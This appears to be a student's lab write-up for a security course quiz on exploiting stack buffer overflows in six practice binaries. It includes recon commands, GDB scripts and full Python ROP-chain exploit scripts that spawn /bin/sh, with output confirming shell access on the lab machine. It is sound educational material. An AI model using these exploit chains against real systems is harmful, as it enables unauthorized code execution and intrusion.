# Quiz 4 — Exploit Findings (Sets: bin2, g1, bsa)

**Status: ALL 6 BINARIES SOLVED** — `uid=9992(apieri01)` confirmed on lab machine `10.16.13.53`.
**Date:** 2026-04-24 | **Lab machine:** 103ws15 (10.16.13.53)

---

## Overview

Three sets solved: `bin2` (bin.1, bin.2), `g1` (bin.1, bin.2), and `bsa` (bin.1, bin.2).
All 6 use the same vulnerability: `display_file()` → unchecked `memcpy` onto a fixed stack buffer.
All 6 have NX on (no shellcode). All 6 build ROP gadgets dynamically via `mmap` + `movb`.

| Binary | Set | OFFSET | gadget_base | WR_ADDR | Result |
|--------|-----|--------|-------------|---------|--------|
| bin.1 | bin2 | 56 | 0x070493e0 | 0x07049500 | uid=9992(apieri01) ✅ |
| bin.2 | bin2 | 56 | 0x070493e0 | 0x07049500 | uid=9992(apieri01) ✅ |
| bin.1 | g1 | 52 | 0x070493e0 | 0x07049500 | uid=9992(apieri01) ✅ |
| bin.2 | g1 | 52 | 0x070493e0 | 0x07049500 | uid=9992(apieri01) ✅ |
| bin.1 | bsa | **48** | 0x070493e0 | 0x07049500 | uid=9992(apieri01) ✅ |
| bin.2 | bsa | **48** | 0x070493e0 | 0x07049500 | uid=9992(apieri01) ✅ |

---

## Step 1 — Recon

```bash
readelf -l ./bin.X | grep GNU_STACK   # → RW (not RWE) = NX on, shellcode won't work
readelf -h ./bin.X | grep Type        # → ET_EXEC = no PIE, fixed addresses
objdump -d ./bin.X | grep -E "^[0-9a-f]+ <"  # → list all functions
```

**Functions found in all 4 binaries:**
- `main`, `display_file`, `root_menu`, `rnd_env`, `init_data` (bin2/bin.2 only), `display_root_menu`
- No `__stack_chk_fail` → no canary

---

## Step 2 — Detect mmap + movb Pattern

```bash
objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -E "mmap|movb"
```

**Output (all 4 binaries):** dozens of `movb $0xNN, offset(%eax)` lines + call to `mmap@plt`

This confirms: gadgets are built at runtime in a heap buffer, then mmap'd to a fixed RWX region.
Do NOT search for gadgets statically — they don't exist in the binary yet.

---

## Step 3 — Decode the movb Gadget Table

Extract bytes in order:
```bash
objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep "movb"
```

Read the `$0xNN` value from each line in order (byte +0x00, +0x01, +0x02, then next gadget at +0x03...).
Each 3 bytes = one gadget: 2-byte x86 instruction + `0xc3` (ret).

### bin2/bin.1 gadget order (decoded from movb table):
```
+0x00: 31 c0 c3  → xor eax,eax; ret
+0x03: 58 5b c3  → pop eax; pop ebx; ret
+0x06: 89 03 c3  → mov [ebx],eax; ret
+0x09: 31 c9 c3  → xor ecx,ecx; ret
+0x0c: 89 c3 c3  → mov ebx,eax; ret
+0x0f: 31 d2 c3  → xor edx,edx; ret
+0x12: b0 0b c3  → mov al,0xb; ret
+0x15: cd 80 c3  → int 0x80; ret
```

### bin2/bin.2 gadget order (DIFFERENT from bin.1):
```
+0x00: 58 5b c3  → pop eax; pop ebx; ret      ← was at +0x03 in bin.1
+0x03: 31 c0 c3  → xor eax,eax; ret            ← was at +0x00 in bin.1
+0x06: 89 03 c3  → mov [ebx],eax; ret
+0x09: 89 c3 c3  → mov ebx,eax; ret            ← was at +0x0c in bin.1
+0x0c: 31 c9 c3  → xor ecx,ecx; ret            ← was at +0x09 in bin.1
+0x0f: 31 d2 c3  → xor edx,edx; ret
+0x12: b0 0b c3  → mov al,0xb; ret
+0x15: cd 80 c3  → int 0x80; ret
```

### g1/bin.1 gadget order:
Same as bin2/bin.1 **EXCEPT**: at +0x12 = `cd 80 c3` (int 0x80) and +0x15 = `b0 0b c3` (mov al,0xb) — **swapped**.
```
+0x12: cd 80 c3  → int 0x80; ret    ← swapped vs bin2/bin.1
+0x15: b0 0b c3  → mov al,0xb; ret  ← swapped vs bin2/bin.1
```

### bsa/bin.1 and bsa/bin.2 gadget order (IDENTICAL to each other, same as bin2/bin.1):
```
+0x00: 31 c0 c3  → xor eax,eax; ret
+0x03: 58 5b c3  → pop eax; pop ebx; ret
+0x06: 89 03 c3  → mov [ebx],eax; ret
+0x09: 31 c9 c3  → xor ecx,ecx; ret
+0x0c: 89 c3 c3  → mov ebx,eax; ret
+0x0f: 31 d2 c3  → xor edx,edx; ret
+0x12: b0 0b c3  → mov al,0xb; ret
+0x15: cd 80 c3  → int 0x80; ret
```
Note: movb table writes bytes starting `58 5b c3...` but mmap offset arithmetic places `31 c0 c3` first.
Always trust GDB memory dump — not the movb write order.

**KEY LESSON:** Never assume gadget order from another binary. Decode fresh each time.

---

## Step 4 — Calculate gadget_base

Find the hardcoded address pushed before `call mmap` in main():
```bash
objdump -d ./bin.X | sed -n '/<main>/,/<__libc_csu_init>/p' | grep -B5 "mmap"
```
**Hardcoded address found: `0x0804942a`** (same for all 4 binaries in these sets)

Formula:
```python
hardcoded_addr = 0x0804942a
pagesize = 0x1000
mmap_base = (hardcoded_addr // pagesize - 0x1000) * pagesize
# = (0x8049 - 0x1000) * 0x1000 = 0x7049 * 0x1000 = 0x07049000
```

With TEMP=1000: `offset(1000) = 0x3e8`
Formula gives: `gadget_base = 0x07049000 + 0x3e8 = 0x070493e8`

**BUT**: GDB memory dump showed gadgets actually start at `0x070493e0` (8 bytes earlier).
The formula is off by 8 — always verify via GDB:

```bash
# GDB verification script (write to /tmp/gdb_check.py then run on lab):
import gdb
gdb.execute("set pagination off")
gdb.execute("b *0x8049376")   # after memcpy in display_file
gdb.execute("run exploit.X")
for i in range(0, 32, 4):
    addr = 0x070493e0 + i
    v = int(gdb.parse_and_eval("*((unsigned int*)%d)" % addr))
    b = v.to_bytes(4, 'little')
    print("0x%08x: %s" % (addr, ' '.join('%02x'%x for x in b)))
gdb.execute("quit")
```
```bash
env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb \
  gdb -batch -ex "source /tmp/gdb_check.py" ./bin.X 2>&1 | grep "0x07049"
```

**Confirmed via GDB:** gadget_base = `0x070493e0`

---

## Step 5 — Find Buffer OFFSET from display_file

```bash
objdump -d ./bin.X | awk '/<display_file>/{f=1} f{print} /<root_menu>/{exit}' | grep "lea"
```

Look for `lea -0xNN(%ebp),%eax` just before `call memcpy`:
- **bin2/bin.1 and bin2/bin.2:** `lea -0x34(%ebp)` → OFFSET = 0x34 + 4 = **56**
- **g1/bin.1 and g1/bin.2:** `lea -0x30(%ebp)` → OFFSET = 0x30 + 4 = **52**
- **bsa/bin.1 and bsa/bin.2:** `lea -0x2c(%ebp)` → OFFSET = 0x2c + 4 = **48**

**KEY LESSON:** OFFSET differs between sets — always check for each binary, not just once per set.

---

## Step 6 — Choose WR_ADDR (Writable Region)

Never use `.bss` when mmap is present:
- `bin2/bin.2` has `init_data()` that fills `.bss` with `0xffffffff` → no null terminator → execve fails silently
- `.bss` may also contain TEMP value (1000 = `0x3e8`) breaking null termination

**Use `mmap_base + 0x500 = 0x07049500`** — the mmap region is zeroed by `MAP_ANONYMOUS`, guaranteed null at offset +8 past any string you write.

---

## Step 7 — Build the ROP Chain

Chain logic (same for all 4 binaries, only addresses differ):
```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)

WR_ADDR = 0x07049500
gb = 0x070493e0

chain  = b'A' * OFFSET                                                    # fill to ret addr
chain += p32(G_POP_EAX_POP_EBX) + b'/bin' + p32(WR_ADDR)   + p32(G_MOV_EBXPTR_EAX)  # write "/bin"
chain += p32(G_POP_EAX_POP_EBX) + b'//sh' + p32(WR_ADDR+4) + p32(G_MOV_EBXPTR_EAX)  # write "//sh"
chain += p32(G_POP_EAX_POP_EBX) + p32(WR_ADDR) + p32(0x41414141) + p32(G_MOV_EBX_EAX)  # ebx = ptr
chain += p32(G_XOR_ECX_ECX) + p32(G_XOR_EDX_EDX) + p32(G_XOR_EAX_EAX)  # zero regs
chain += p32(G_MOV_AL_0B) + p32(G_INT_80)                                 # eax=11, syscall

data = str(len(chain)).encode() + b' ' + chain
```

### Final exploit scripts

**bin2/bin.1** (OFFSET=56):
```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
gb = 0x070493e0; WR = 0x07049500; OFFSET = 56
chain  = b'A' * OFFSET
chain += p32(gb+0x03) + b'/bin' + p32(WR)   + p32(gb+0x06)
chain += p32(gb+0x03) + b'//sh' + p32(WR+4) + p32(gb+0x06)
chain += p32(gb+0x03) + p32(WR) + p32(0x41414141) + p32(gb+0x0c)
chain += p32(gb+0x09) + p32(gb+0x0f) + p32(gb+0x00) + p32(gb+0x12) + p32(gb+0x15)
with open('bin2/exploit.1', 'wb') as f: f.write(str(len(chain)).encode() + b' ' + chain)
```

**bin2/bin.2** (OFFSET=56):
```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
gb = 0x070493e0; WR = 0x07049500; OFFSET = 56
chain  = b'A' * OFFSET
chain += p32(gb+0x00) + b'/bin' + p32(WR)   + p32(gb+0x06)
chain += p32(gb+0x00) + b'//sh' + p32(WR+4) + p32(gb+0x06)
chain += p32(gb+0x00) + p32(WR) + p32(0x41414141) + p32(gb+0x09)
chain += p32(gb+0x0c) + p32(gb+0x0f) + p32(gb+0x03) + p32(gb+0x12) + p32(gb+0x15)
with open('bin2/exploit.2', 'wb') as f: f.write(str(len(chain)).encode() + b' ' + chain)
```

**g1/bin.1** (OFFSET=52, INT80/MOVAL swapped at +0x12/+0x15):
```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
gb = 0x070493e0; WR = 0x07049500; OFFSET = 52
chain  = b'A' * OFFSET
chain += p32(gb+0x03) + b'/bin' + p32(WR)   + p32(gb+0x06)
chain += p32(gb+0x03) + b'//sh' + p32(WR+4) + p32(gb+0x06)
chain += p32(gb+0x03) + p32(WR) + p32(0x41414141) + p32(gb+0x0c)
chain += p32(gb+0x09) + p32(gb+0x0f) + p32(gb+0x00) + p32(gb+0x15) + p32(gb+0x12)
#  note: MOV_AL=gb+0x15, INT80=gb+0x12 (SWAPPED vs bin2/bin.1)
with open('g1/exploit.1', 'wb') as f: f.write(str(len(chain)).encode() + b' ' + chain)
```

**g1/bin.2** (OFFSET=52, same order as bin2/bin.2):
```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
gb = 0x070493e0; WR = 0x07049500; OFFSET = 52
chain  = b'A' * OFFSET
chain += p32(gb+0x00) + b'/bin' + p32(WR)   + p32(gb+0x06)
chain += p32(gb+0x00) + b'//sh' + p32(WR+4) + p32(gb+0x06)
chain += p32(gb+0x00) + p32(WR) + p32(0x41414141) + p32(gb+0x09)
chain += p32(gb+0x0c) + p32(gb+0x0f) + p32(gb+0x03) + p32(gb+0x12) + p32(gb+0x15)
with open('g1/exploit.2', 'wb') as f: f.write(str(len(chain)).encode() + b' ' + chain)
```

---

## Step 8 — Verify

```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb bin2/bin.1 bin2/exploit.1
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb bin2/bin.2 bin2/exploit.2
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb g1/bin.1   g1/exploit.1
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb g1/bin.2   g1/exploit.2
```

**All output:** `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)` ✅

---

## Confirmed Gadget Tables

### bin2/bin.1 — gadget_base = 0x070493e0

| Address | Bytes | Gadget | Variable |
|---------|-------|--------|----------|
| 0x070493e0 (+0x00) | 31 c0 c3 | xor eax,eax; ret | G_XOR_EAX |
| 0x070493e3 (+0x03) | 58 5b c3 | pop eax; pop ebx; ret | G_POP_POP |
| 0x070493e6 (+0x06) | 89 03 c3 | mov [ebx],eax; ret | G_MOV_PTR |
| 0x070493e9 (+0x09) | 31 c9 c3 | xor ecx,ecx; ret | G_XOR_ECX |
| 0x070493ec (+0x0c) | 89 c3 c3 | mov ebx,eax; ret | G_MOV_EBX |
| 0x070493ef (+0x0f) | 31 d2 c3 | xor edx,edx; ret | G_XOR_EDX |
| 0x070493f2 (+0x12) | b0 0b c3 | mov al,0xb; ret | G_MOV_AL |
| 0x070493f5 (+0x15) | cd 80 c3 | int 0x80; ret | G_INT80 |

### bin2/bin.2 — gadget_base = 0x070493e0

| Address | Bytes | Gadget |
|---------|-------|--------|
| 0x070493e0 (+0x00) | 58 5b c3 | pop eax; pop ebx; ret |
| 0x070493e3 (+0x03) | 31 c0 c3 | xor eax,eax; ret |
| 0x070493e6 (+0x06) | 89 03 c3 | mov [ebx],eax; ret |
| 0x070493e9 (+0x09) | 89 c3 c3 | mov ebx,eax; ret |
| 0x070493ec (+0x0c) | 31 c9 c3 | xor ecx,ecx; ret |
| 0x070493ef (+0x0f) | 31 d2 c3 | xor edx,edx; ret |
| 0x070493f2 (+0x12) | b0 0b c3 | mov al,0xb; ret |
| 0x070493f5 (+0x15) | cd 80 c3 | int 0x80; ret |

### g1/bin.1 — same as bin2/bin.1 EXCEPT +0x12 and +0x15 are swapped

| Address | Bytes | Gadget |
|---------|-------|--------|
| 0x070493f2 (+0x12) | cd 80 c3 | **int 0x80; ret** (swapped) |
| 0x070493f5 (+0x15) | b0 0b c3 | **mov al,0xb; ret** (swapped) |

→ In the chain: call `gb+0x15` (mov al,0xb) BEFORE `gb+0x12` (int 0x80)

### g1/bin.2 — identical order to bin2/bin.2, OFFSET=52

---

## Common Pitfalls Encountered

| Problem | Symptom | Root Cause | Fix |
|---------|---------|------------|-----|
| Wrong gadget_base | Segfault, no output | Formula gives +0x3e8, actual is +0x3e0 | Always verify via GDB memory dump |
| Wrong OFFSET | Segfault, no output | Assumed bin2 offset for g1/bsa | Read `lea -0xNN(%ebp)` in display_file per binary |
| INT80/MOVAL swapped | Shell never executes | g1/bin.1 has different byte order | Decode movb table fresh, don't copy from bin2 |
| Wrong WR_ADDR (.bss) | execve returns -1, no output | init_data() or TEMP value poisons .bss | Use mmap_base+0x500 always |
| movb order ≠ runtime order | Wrong gadget used | mmap base offset shifts byte position | Trust GDB dump, not movb sequence |

---

## GDB Debug Commands Used

```bash
# Find gadget_base (confirmed 0x070493e0):
cat > /tmp/gdb_check.py << 'EOF'
import gdb
gdb.execute("set pagination off")
gdb.execute("b *0x8049376")
gdb.execute("run exploit.X")
for i in range(0, 32, 4):
    addr = 0x070493e0 + i
    v = int(gdb.parse_and_eval("*((unsigned int*)%d)" % addr))
    b = v.to_bytes(4, 'little')
    print("0x%08x: %s" % (addr, ' '.join('%02x'%x for x in b)))
gdb.execute("quit")
EOF
env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb \
  gdb -batch -ex "source /tmp/gdb_check.py" ./bin.X 2>&1 | grep "0x07049"

# Confirm EBP (to verify OFFSET):
env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb gdb ./bin.X
(gdb) b *0x8049376
(gdb) run exploit.X
(gdb) p/x $ebp       # → shows EBP value for offset calculation
```

---

## Solver Script (generates all 4 exploits)

Stored at `~/solve_final.sh` on lab machine and `C:\tmp\solve_final.sh` locally.

```python
#!/usr/bin/env python3
import struct

def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
gb      = 0x070493e0
WR_ADDR = 0x07049500

def build(offset, g_pop, g_xea, g_mptr, g_mebx, g_xecx, g_xedx, g_al, g_int80):
    c  = b'A' * offset
    c += p32(g_pop); c += b'/bin'; c += p32(WR_ADDR);   c += p32(g_mptr)
    c += p32(g_pop); c += b'//sh'; c += p32(WR_ADDR+4); c += p32(g_mptr)
    c += p32(g_pop); c += p32(WR_ADDR); c += p32(0x41414141); c += p32(g_mebx)
    c += p32(g_xecx); c += p32(g_xedx); c += p32(g_xea); c += p32(g_al); c += p32(g_int80)
    return str(len(c)).encode() + b' ' + c

configs = [
    # (outfile, offset, pop, xea, mptr, mebx, xecx, xedx, al, int80)
    ('bin2/exploit.1', 56, gb+0x03, gb+0x00, gb+0x06, gb+0x0c, gb+0x09, gb+0x0f, gb+0x12, gb+0x15),
    ('bin2/exploit.2', 56, gb+0x00, gb+0x03, gb+0x06, gb+0x09, gb+0x0c, gb+0x0f, gb+0x12, gb+0x15),
    ('g1/exploit.1',   52, gb+0x03, gb+0x00, gb+0x06, gb+0x0c, gb+0x09, gb+0x0f, gb+0x15, gb+0x12),
    ('g1/exploit.2',   52, gb+0x00, gb+0x03, gb+0x06, gb+0x09, gb+0x0c, gb+0x0f, gb+0x12, gb+0x15),
    # bsa set (OFFSET=48, same gadget order as bin2/bin.1 for both bin.1 and bin.2)
    ('bsa/exploit.1',  48, gb+0x03, gb+0x00, gb+0x06, gb+0x0c, gb+0x09, gb+0x0f, gb+0x12, gb+0x15),
    ('bsa/exploit.2',  48, gb+0x03, gb+0x00, gb+0x06, gb+0x0c, gb+0x09, gb+0x0f, gb+0x12, gb+0x15),
]

for cfg in configs:
    outfile = cfg[0]
    data = build(*cfg[1:])
    with open(outfile, 'wb') as f: f.write(data)
    print(f'[+] {outfile}')
```
